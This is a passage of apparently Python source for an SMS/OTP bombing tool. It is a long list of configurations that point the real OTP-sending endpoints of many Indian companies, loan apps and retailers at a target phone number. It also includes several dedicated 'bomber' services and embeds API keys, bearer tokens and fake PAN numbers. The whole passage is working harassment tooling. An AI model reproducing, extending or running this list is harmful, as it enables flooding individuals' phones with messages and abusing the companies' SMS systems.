        ApiConfig("Nykaa", "https://www.nykaa.com/app-api/index.php/customer/send_otp", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "source=sms&mobile_number={phone}"),
        ApiConfig("RummyCircle", "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","isPlaycircle":false}'),
        ApiConfig("Cosmofeed", "https://prod.api.cosmofeed.com/api/user/authenticate", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","version":"1.4.28"}'),
        ApiConfig("Revv", "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","deviceType":"website"}'),
        ApiConfig("PayMe_India", "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","app_signature":"S10ePIIrbH3"}'),
        ApiConfig("Bomberr", "https://bomberr.onrender.com/num={phone}", "GET", {}, None),
        ApiConfig("PaisaOnSalary", "https://cms.paisaonsalary.com/api/Api/Website/InstantJourneyController/appCustomerRegistration", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","event_name":"login"}'),
        ApiConfig("PaisaBoxx", "https://api.paisaboxx.com/identity/UserAuth/loginWithMobile?country_code=91&mobile={phone}&partner_id=6350faa323&source=hexa&campaign=delhi_5499", "POST",
                  {"Content-Type": "application/json", "Content-Length": "0"}, "{}"),
        ApiConfig("LoanZap", "https://webapi.loanzap.in/v2/apply-loan/register-user", "POST",
                  {"Content-Type": "application/json"}, '{"name":"Binod","mobile":"{phone}","email":"test@gmail.com","terms":"1"}'),
        ApiConfig("CashKredit", "https://api.cashkredit.in/v2/apply-loan/register-user", "POST",
                  {"Content-Type": "application/json"}, '{"pan":"ABCDE1234F","name":"Binod","mobile":"{phone}","email":"test@gmail.com","terms":"1"}'),
        ApiConfig("RupeeLending", "https://rupeelending.com/apply-now/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("BrightLoans", "https://brightloans.in/login-sbm", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile={phone}&current_page=login&is_existing_customer=2&device_id={random_md5}"),
        ApiConfig("SalaryTopUp", "https://salarytopup.in/api/Api/Website/InstantJourneyController/appCustomerRegisteration", "POST",
                  {"Content-Type": "application/json", "Auth": "MjQ4ZmY5MGM0MmM2N2EyOTJlZWE0MTBiNGU2Y2Q2NzU="},
                  '{"mobile":"{phone}","event_name":"login"}'),
        ApiConfig("TezCredit", "https://api.tezcredit.com/identity/UserAuth/loginWithMobile?country_code=91&mobile={phone}", "POST",
                  {"Content-Type": "application/json"}, "{}"),
        ApiConfig("Swiggy_SMS", "https://www.swiggy.com/mapi/auth/sms-otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","_csrf":"wYqwp6Boyjtu-la46bXHvrfnJrrsKmi4MmM3RTGk"}'),
        ApiConfig("TataCapital_HL", "https://hlonline.tatacapital.com/APILayer/dlp/otp/services/generateOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}","isNew":1,"deviceOs":"web"}'),
        ApiConfig("TataCapital_PL", "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/generateOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}","deviceOS":"Web","applSource":"PL"}'),
        ApiConfig("TataCapital_LAP", "https://onlinelaploans.tatacapital.com/APILayer/dlp/otp/services/generateOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}","isNew":1,"deviceOs":"web"}'),
        ApiConfig("Univest", "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}", "GET", {}, None),
        ApiConfig("HeroFinCorp_Festive", "https://festive.api.herofincorp.com/v1/customer/otp/{phone}", "GET", {}, None),
        ApiConfig("MuscleBlaze", "https://www.muscleblaze.com/veronica/user/validate/9/{phone}/signup?plt=2&st=9", "GET",
                  {"HKAUTH": "396144437|9l7fQT5m5HJtTrXqRZiWdQ==", "pageuri": "/", "st": "9", "plt": "2"}),
        ApiConfig("INRFlash", "https://offers.inrflash.com/campinr/index.php", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "action=send_otp&phoneNo={phone}"),
        ApiConfig("MuthootFinance", "https://www.muthootfinance.com/smsapi.php", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile={phone}&pin=Xmd6TERfO1haXjo3"),
        ApiConfig("CRMSL", "https://api.crmsl.com/Api/Website/InstantJourneyController/appCustomerRegisteration", "POST",
                  {"Content-Type": "application/json", "Auth": "ZTI4MTU1MzE4NWQ2MGQyZTFhNWM0NGU3M2UzMmM3MDM="},
                  '{"mobile":"{phone}","event_name":"login"}'),
        ApiConfig("Factori", "https://factori.com/login/check_user_exists", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobNumber={phone}&countryCode=91"),
        ApiConfig("Zepto", "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}"}'),
        ApiConfig("OneMG", "https://www.1mg.com/auth_api/v6/create_token", "POST",
                  {"Content-Type": "application/json"}, '{"number":"{phone}"}'),
        ApiConfig("ShipRocket2", "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}"}'),
        ApiConfig("GoKwik", "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "POST",
                  {"Content-Type": "application/json", "gk-merchant-id": "19g6jlc658iad"}, '{"phone":"{phone}","country":"in"}'),
        ApiConfig("EntriApp", "https://entri.app/api/v3/users/check-phone/", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"+91{phone}","recaptcha_response":"dummy_token"}'),
        ApiConfig("Apna", "https://production.apna.co/api/userprofile/v1/otp/", "POST",
                  {"Content-Type": "application/json"}, '{"hash_type":"original","phone_number":"91{phone}","request_id":"{timestamp}","retries":0}'),
        ApiConfig("DigiCredit", "https://customer-backend.digicredit.in/customers/customer-login", "POST",
                  {"Content-Type": "application/json", "client-id": "7de19504-f422-42dc-bd51-5ed5dfb170c1"},
                  '{"phoneNo":"{phone}","journey_down":"true"}'),
        ApiConfig("Moglix", "https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2", "POST",
                  {"Content-Type": "application/json", "x-platform": "PWA"},
                  '{"email":"","phone":"{phone}","type":"p","source":"signup"}'),
        ApiConfig("Housing2", "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API", "POST",
                  {"Content-Type": "application/json", "app-name": "mobile_web_buyer"},
                  '{"query":"mutation($phone:String){sendOtp(phone:$phone){success message}}","variables":{"phone":"{phone}"}}'),
        ApiConfig("MyMoneyBazaar", "https://mm-app-backend.mymoneybazaar.com/api/v2/authentication/phone_no_verify/", "POST",
                  {"Content-Type": "application/json"}, '{"phone_number":"{phone}"}'),
        ApiConfig("Shopsy", "https://www.shopsy.in/1.rome/api/1/action/view", "POST",
                  {"Content-Type": "application/json"}, '{"actionRequestContext":{"loginId":"{phone}","loginType":"MOBILE","verificationType":"OTP"}}'),
        ApiConfig("KamakshiMoney", "https://loan-api.kamakshimoney.com/customers/customer-login-byMobile", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("PrimeCash", "https://api.primecash.app/api/v1/user", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","isTNCVerified":true,"hash":"O9BmoTki4+6"}'),
        ApiConfig("Allen", "https://api.allen-live.in/api/v1/auth/sendOtp", "POST",
                  {"Content-Type": "application/json", "x-device-id": "{uuid}", "x-client-type": "mweb"},
                  '{"country_code":"91","phone_number":"{phone}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}'),
        ApiConfig("RupeeCare", "https://rc-backend.root.deployment.rupeecare.money/api/auth/get_otp", "POST",
                  {"Content-Type": "application/json", "client-id": "d8247367-fabd-48c1-8314-ea00b431c232"},
                  '{"phoneNo":"{phone}","clientId":"d8247367-fabd-48c1-8314-ea00b431c232"}'),
        ApiConfig("Rupyalelo", "https://apply.rupyalelo.com/api/login", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("RoopyaMoney", "https://api.roopya.money/api/v2/customer/lead", "POST",
                  {"Content-Type": "application/json", "apiSecret": "3acd32a5276b6b968028c2e7d6471051d5df9771d9049e2fc317b8e93113bdcc",
                   "apiKey": "0025f469f0e293c539a207f2aaaa85c75f1c30191c31c44cc010c3b076ee1216"},
                  '{"phone":"{phone}","countryCode":"+91"}'),
        ApiConfig("Dhanrishi", "https://ub1.dhanrishi.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("SalaryOnTime", "https://journey.sotcrm.com/api/v1/journey-auth/send-otp/", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","sourceId":1}'),
        ApiConfig("SpeedoLoan", "https://loanapply.speedoloan.com/api/login", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("FastSalary", "https://apilm.fastsalary.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json", "domain": "app.fastsalary.com"},
                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"546481","panCard":"GDODJ5434B"}'),
        ApiConfig("CredNidhi", "https://apilm.crednidhi.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json", "domain": "app.crednidhi.com"},
                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"50000","panCard":"HSOSN5464B"}'),
        ApiConfig("ClickMyLoan", "https://appb.clickmyloan.com/api/v2/authentication/phone_no_verify/", "POST",
                  {"Content-Type": "application/json"}, '{"phone_number":"{phone}"}'),
        ApiConfig("SuryaLoan", "https://microservices.suryaloan.com/api/v1/customer-journey/login", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","sourceId":1}'),
        ApiConfig("CreditSea", "https://backend.creditsea.com/api/v1/otp/generate-otp", "POST",
                  {"Content-Type": "application/json", "platform": "CREDITSEA"},
                  '{"phoneNumber":"{phone}","isWebUser":true}'),
        ApiConfig("SalarySetu", "https://backend.salarysetu.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("ShreeLoan", "https://loanapply.shreeloan.com/api/login", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("PocketCredit", "https://pocketcredit.in/api/auth/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("ClickForMoney", "https://clickformoney.in/api/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("JhatpatCash", "https://apilm.jhatpatcash.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json", "domain": "app.jhatpatcash.com"},
                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","panCard":"GSISB5468H"}'),
        ApiConfig("QuaLoan", "https://apilm.qualoan.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json", "domain": "app.qualoan.com"},
                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","panCard":"VUJVU5675H"}'),
        ApiConfig("NexiLoans", "https://api-backend.nexiloans.com/user/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("ToofanLoan", "https://apilm.toofanloan.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json", "domain": "app.toofanloan.com"},
                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","panCard":"TSISV5434B"}'),
        ApiConfig("Rupee4u", "https://loanapply.rupee4u.com/api/login", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("PaisaPop", "https://apilm.paisapop.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json", "domain": "web.paisapop.com"},
                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","panCard":"FUOUR2389B"}'),
        ApiConfig("Figii", "https://consumer.figii.in/api/auth/login/", "POST",
                  {"Content-Type": "application/json"}, '{"username":"{phone}","medium":"SMS","meta":{}}'),
        ApiConfig("MinutesLoan", "https://apilm.minutesloan.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json", "domain": "app.minutesloan.com"},
                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","panCard":"ABCDE5438F"}'),
        ApiConfig("AyushmanLoan", "https://backend.ayushmanloan.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("Creditt", "https://prod-v4-app-api.credittapi.com/app/auth/mobile/otp/sent", "POST",
                  {"Content-Type": "application/json", "appStore": "web_app", "api_version": "1.0"},
                  '{"mobile":"{phone}"}'),
        ApiConfig("FundsBull", "https://backend.fundsbull.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone_number":"{phone}"}'),
        ApiConfig("F1SpeedLoan", "https://backend.f1speedloan.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("FundoBaba", "https://backend.fundobaba.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("RupeeRedee", "https://webservice-in-prod.rupeeredee.com/gate/api/v1/OTP", "POST",
                  {"Content-Type": "application/json", "platform": "Web"},
                  '{"number":"+91{phone}","type":"Mobile"}'),
        ApiConfig("UdhaarPortal", "https://crm.udhaarportal.com/api/Api/Website/InstantJourneyController/appCustomerRegisteration", "POST",
                  {"Content-Type": "application/json", "Auth": "ZTI4MTU1MzE4NWQ2MGQyZTFhNWM0NGU3M2UzMmM3MDM="},
                  '{"mobile":"{phone}","event_name":"login"}'),
        ApiConfig("DuniyaFinance", "https://backend.duniyafinance.in/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("BlinkrLoan", "https://backend.blinkrloan.com/api/user/v3/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("NaukriLoans", "https://backend.naukriloans.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("UdharCapital", "https://www.udharcapital.com/api/send_otp.php", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "phone={phone}"),
        ApiConfig("SalaryBolt", "https://backend.salarybolt.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("SabkaLoan", "https://api.sabkaloan.com/api/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("PaisaInTime", "https://micro-server-for-paisaintime-nrbe5.ondigitalocean.app/api/auth/get_otp", "POST",
                  {"Content-Type": "application/json", "client-id": "08b61f94-4e99-4d4e-abe9-108a1078bbdb"},
                  '{"phoneNo":"{phone}","clientId":"08b61f94-4e99-4d4e-abe9-108a1078bbdb"}'),
        ApiConfig("FastPaise", "https://backend.fastpaise.in/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("Penpencil", "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", "POST",
                  {"Content-Type": "application/json", "client-type": "WEB", "client-id": "5eb393ee95fab7468a79d189"},
                  '{"mobile":"{phone}","countryCode":"+91","subOrgId":"SUB-PWLI000"}'),
        ApiConfig("OTPBomber", "https://otpbomber-40jd.onrender.com/api/bomb", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","ip":"192.168.1.1","iterations":2}'),
        ApiConfig("RamFincorp", "https://loan-api.ramfincorp.com/customers/customer-login-byMobile", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("InCred", "https://gateway-api.incred.com/website-bff/public/v1/common/login/otpgenerate", "POST",
                  {"Content-Type": "application/json"},
                  '{"MOBILE":"{phone}","UTM_DETAILS":{"partnerId":"9250608873861026P"},"ON_BOARDING_TYPE":"FROM_LOAN_ENQUIRY"}'),
        ApiConfig("Sephora", "https://sephora.in/api/service/application/user/authentication/v1.0/login/otp", "POST",
                  {"Content-Type": "application/json", "authorization": "Bearer NjUyM2ZhNWY0MWY0ZWI0YzEwYTFkODY5Ong5Z0hpYWVpZA=="},
                  '{"mobile":"{phone}","country_code":"91"}'),
        ApiConfig("JioSaavn", "https://api1.jiosaavn.com/jio/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"phone_number":"+91{phone}"}'),
        ApiConfig("Cashvia", "https://customer-backend.cashvia.in/customers/customer-login", "POST",
                  {"Content-Type": "application/json", "client-id": "7de19504-f422-42dc-bd51-5ed5dfb170c1"},
                  '{"phoneNo":"{phone}","journey_down":true}'),
        ApiConfig("RojgarKaro_SendOTP", "https://rojgarkaro.in/api/auth/sendOTP", "POST",
                  {"Content-Type": "application/json"}, '{"mobile_no":"{phone}","isSessionActive":false}'),
        ApiConfig("RojgarKaro_Signup", "https://rojgarkaro.in/api/auth/sendOTPOnSignup", "POST",
                  {"Content-Type": "application/json"}, '{"mobile_no":"{phone}","email_id":"test@gmail.com"}'),
        ApiConfig("BajajFinserv", "https://apigateway.bajajfinserv.in/apigateway/otp/sso", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}","source":"WEB"}'),
        ApiConfig("TataCliq", "https://www.tatacliq.com/api/v1/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","state":"login"}'),
        ApiConfig("Droom", "https://api.droom.in/v1/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","country_code":"91"}'),
        ApiConfig("Yatra", "https://secure.yatra.com/social/common/yatra/action/doMobileLogin", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobileNo={phone}"),
        ApiConfig("Licious", "https://www.licious.com/auth/api/v1/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","countryCode":"+91"}'),
        ApiConfig("CureFoods", "https://web.curefoods.com/api/v2/auth/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","country_code":"+91"}'),
        ApiConfig("Puma", "https://in.puma.com/on/demandware.store/Sites-IN-Site/en_IN/Login-OtpRegistration", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "dwfrm_phone={phone}&format=ajax"),
        ApiConfig("Decathlon", "https://www.decathlon.in/api/v1/auth/sendOTP", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","isLogin":true}'),
        ApiConfig("McDonalds", "https://mcdelivery.mcdonaldsindia.com/api/v1/customer/otp", "POST",
                  {"Content-Type": "application/json"}, '{"phoneNumber":"{phone}","source":"web"}'),
        ApiConfig("Dominos", "https://pizzaonline.dominos.co.in/api/v1/auth/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","source":"WEB"}'),
        ApiConfig("Zivame", "https://www.zivame.com/auth/public/v1/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","countryCode":"IN"}'),
        ApiConfig("FirstCry", "https://www.firstcry.com/api/v2/auth/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Netmeds", "https://www.netmeds.com/api/v1/auth/login", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("Tata1mg", "https://www.1mg.com/auth_api/v6/create_token", "POST",
                  {"Content-Type": "application/json"}, '{"number":"{phone}","login_with":"mobile"}'),
        ApiConfig("Upstox", "https://api.upstox.com/v2/login/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","client_id":"UPSTOX"}'),
        ApiConfig("Zerodha", "https://kite.zerodha.com/api/login", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "user_id={phone}"),
        ApiConfig("Groww", "https://groww.in/api/v2/auth/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","platform":"WEB"}'),
        ApiConfig("PolicyBazaar", "https://www.policybazaar.com/api/v1/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","source":"web"}'),
        ApiConfig("Ditto", "https://www.dittotv.in/auth/sendOTP/v1", "POST",
                  {"Content-Type": "application/json"}, '{"mobileno":"{phone}","sendOTP":true}'),
        ApiConfig("SonyLiv", "https://www.sonyliv.com/api/v1/auth/sendOTP", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","countryCode":"+91"}'),
        ApiConfig("Hotstar", "https://api.hotstar.com/r9/v1/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","countryCode":"IN"}'),
        ApiConfig("BookMyShow_SMS", "https://in.bookmyshow.com/auth/send/otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("RentoMojo_Signup", "https://www.rentomojo.com/api/RMUsers/signup", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","password":"Test@123","name":"Test User"}'),
        ApiConfig("Furlenco", "https://www.furlenco.com/api/v1/auth/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","term":"true"}'),
        ApiConfig("CityFurnish", "https://www.cityfurnish.com/api/v1/auth/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Ixigo", "https://www.ixigo.com/api/v2/auth/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","countryCode":"+91"}'),
        ApiConfig("EaseMyTrip", "https://www.easemytrip.com/api/otp/SendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"Mobileno":"{phone}","Type":"M"}'),
        ApiConfig("Goibibo", "https://www.goibibo.com/api/v2/auth/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","countryCode":"+91"}'),
        ApiConfig("RedBus", "https://www.redbus.in/api/v2/auth/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","source":"web"}'),
        ApiConfig("Rapido_SMS", "https://rapido.bike/api/v1/otp/generate", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","source":"SMS"}'),
        ApiConfig("PocketMoney", "https://api2.the-pocket-money.com/pokktmoney/send_verification_code?os_type=16&country_code=91&verification_phone={phone}", "GET",
                  {"X-Verification-Key": "NTk2OTJjNzI3NzAwZDdkYjQxYmM5N2Y1MzlmNTA2NmM=",
                   "X-POCKET-KEY": "FwMqEpp8XHfrR8xBTGiteY62q3NW96ulwqkGeY7lDU7hfYZ7H4DJPITtTZwyfWj1"}),
        ApiConfig("MagicPin_SMS", "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/", "POST",
                  {"Content-Type": "application/json", "auth-secret-key": "kQLMCQBrfevxhzuPpFWT",
                   "origin": "https://magicpin.in", "x-requested-with": "mark.via.gp"},
                  '{"phoneNumber":"91{phone}","authMethod":"sms","token":"{random_md5}"}'),
        ApiConfig("Udaan_SMS", "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "x-app-id": "udaan-auth"},
                  "mobile={phone}"),
        ApiConfig("SmartCoin_SMS", "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request", "POST",
                  {"Content-Type": "application/json", "user_platform": "WEBFLOW", "platform_code": "olyv"},
                  '{"phone_number":"{phone}","app_version":"100101","channel":"SMS","request_type":"REGISTRATION","onboarding_consent":true}'),
        ApiConfig("OLX_SMS", "https://www.olx.in/api/auth/authenticate", "POST",
                  {"Content-Type": "application/json", "user-agent": "okhttp/3.9.1"},
                  '{"method":"sms","phone":"{phone}","language":"en-IN","grantType":"retry"}'),
        ApiConfig("OTPBomber_API", "https://otp-bomber-api.vercel.app/api?phone={phone}", "GET", {}, None),
        ApiConfig("Codfirm_SMS", "https://api.codfirm.in/api/customers/login/otp/send", "POST",
                  {"Content-Type": "application/json", "x-csrf-token": "{random_md5}"},
                  '{"medium":"sms","storeUrl":"clinikally.myshopify.com","phone":"{phone}"}'),
        ApiConfig("CreditSea2", "https://backend.creditsea.com/api/v1/otp/generate-otp", "POST",
                  {"Content-Type": "application/json", "platform": "CREDITSEA"},
                  '{"phoneNumber":"{phone}","fromLoginPage":true,"isWebUser":true}'),
        ApiConfig("Penpencil_SMS", "https://api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "POST",
                  {"Content-Type": "application/json", "version": "0.0.1", "subOrgId": "SUB-PWST002",
                   "client-id": "64254d66be2a390018e6d348", "client-type": "WEB"},
                  '{"mobile":"{phone}","firstName":"djdk","lastName":"","countryCode":"+91","subOrgId":""}'),
        ApiConfig("Oziva_SMS", "https://api.prod.oziva.in/nitro/send/", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","source":"order_management","type":"sms","consentForAddressUse":false}'),
        ApiConfig("Astroyogi_Comm_SMS", "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3", "POST",
                  {"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg4NDU0MTc4LCJleHAiOjE3OTYyMzAxNzh9."},
                  '{"PhoneNumber":"{phone}","PhoneCode":"91","Domain":"Web","CountryId":"IN","IpAddress":"117.225.1.174"}'),
        ApiConfig("Refyne_SMS", "https://prod-api.refyne.co.in/auth/v3/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"channel":"SMS","recipient":"{phone}"}'),
        ApiConfig("Housing3", "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API", "POST",
                  {"Content-Type": "application/json", "app-name": "mobile_web_buyer"},
                  '{"query":"mutation($phone:String){sendOtp(phone:$phone){success message}}","variables":{"phone":"{phone}"}}'),
        ApiConfig("HERE_SMS", "https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","countryCodeId":"b43569eb-6798-43fb-8d27-47d55d7c544b","source":"sms"}'),
        ApiConfig("VisitApp_SMS", "https://api.getvisitapp.com/v3/new-auth/login-phone", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","countryCode":91,"platform":"WEB"}'),
        ApiConfig("RegistaniaChar_SMS", "https://admin.registaniachar.com/api/whatsapp/send-otp", "POST",
                  {"Content-Type": "application/json", "X-Signature": "6d31a2232ee5ec6e868d2eade30e657ddce8f6ff4b417818313feef6a220a553"},
                  '{"phone":"{phone}"}'),
        ApiConfig("Astroyogi_Comm_SMS2", "https://comm.astroyogi.com/api/OtpComm/SendOtp", "POST",
                  {"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg4NDU0MTc4LCJleHAiOjE3OTYyMzAxNzh9."},
                  '{"phoneCode":"91","countryCode":"IN","mobileNumber":"{phone}","platform":"Web","IpAddress":"117.225.1.174","requestType":"sms"}'),
        ApiConfig("MakeMyTrip_SMS", "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in&language=eng&currency=inr", "POST",
                  {"Content-Type": "application/json", "vid": "{uuid}", "tid": "{uuid}", "deviceid": "{uuid}"},
                  '{"loginId":"{phone}","type":6,"isEncoded":false,"channel":["MOBILE"],"countryCode":"91"}'),
        ApiConfig("IGP_SMS", "https://www.igp.com/v2/loginSignup", "POST",
                  {"Content-Type": "application/json"},
                  '{"email":"","mprefix":"91","mob":"{phone}","cid":"99","claimNumber":false,"newUserFlag":false,"verifyOtp":false,"otp":"","isGuest":false,"isInternational":false}'),
        ApiConfig("FreeCharge_SMS", "https://www.freecharge.in/api/ims/rest/otp/resend", "POST",
                  {"Content-Type": "application/json", "csrfRequestIdentifier": "{uuid}", "fcChannel": "12"},
                  '{"otpId":"{uuid}","otpThroughCall":false,"platformType":"WEB"}'),
        ApiConfig("Happi_SMS", "https://dev-services.happimobiles.com/api/user-login/homepage", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("ThakurBombCyber", "https://thakur-bombcyber.kundanjha7782.workers.dev/?mobile={phone}", "GET", {}, None),
        ApiConfig("Hungama_OTP", "https://communication.api.hungama.com/v1/communication/otp", "POST",
                  {"Content-Type": "application/json", "identifier": "home"},
                  '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}'),
        ApiConfig("BeepKart", "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "POST",
